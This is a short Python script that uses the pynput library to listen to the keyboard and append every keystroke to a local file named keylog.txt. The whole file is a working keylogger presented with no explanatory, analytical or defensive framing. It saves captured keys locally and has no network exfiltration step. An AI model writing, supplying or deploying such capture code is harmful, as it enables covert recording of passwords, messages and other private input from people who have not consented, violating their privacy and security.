from pynput.keyboard import Listener

def on_press(key):
    key = str(key).replace("'", "")
    with open("keylog.txt", "a") as file:
        file.write(key + " ")

with Listener(on_press=on_press) as listener:
    listener.join()
